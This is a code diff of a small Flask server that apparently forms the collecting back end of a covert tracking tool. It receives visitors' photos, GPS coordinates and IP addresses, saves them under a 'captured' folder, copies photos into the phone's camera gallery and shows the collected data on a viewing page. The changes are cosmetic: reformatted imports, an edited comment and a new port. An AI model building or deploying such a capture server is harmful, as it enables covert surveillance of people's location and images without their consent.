@@ -1,4 +1,7 @@
-import os, json, base64, shutil
+import os
+import json
+import base64
+import shutil
 from datetime import datetime
 from flask import Flask, request, render_template, jsonify, send_from_directory
 
@@ -8,6 +11,7 @@ CAPTURED_DIR = "captured"
 IMAGES_DIR = os.path.join(CAPTURED_DIR, "images")
 DATA_FILE = os.path.join(CAPTURED_DIR, "data.txt")
 GPS_FILE = os.path.join(CAPTURED_DIR, "gps.txt")
+
 os.makedirs(IMAGES_DIR, exist_ok=True)
 
 @app.route('/')
@@ -25,6 +29,7 @@ def capture():
         lat = data.get('lat', '-')
         lon = data.get('lon', '-')
         acc = data.get('acc', '-')
+
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
         image_path = ''
@@ -38,7 +43,7 @@ def capture():
                 f.write(image_bytes)
             image_path = f"/images/{filename}"
 
-            # 🔥 OTOMATIS COPY FOTO KE GALERI HP
+            # Auto copy to gallery (HP)
             try:
                 shutil.copy(filepath, f"/sdcard/DCIM/Camera/{filename}")
             except:
@@ -58,6 +63,7 @@ def capture():
             f.write(f"[{timestamp}] {lat}, {lon} | {acc}m | IP: {ip}\n")
 
         return jsonify({"status": "success"})
+
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
@@ -74,4 +80,4 @@ def view_data():
         return "Belum ada data"
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=8080, debug=False)
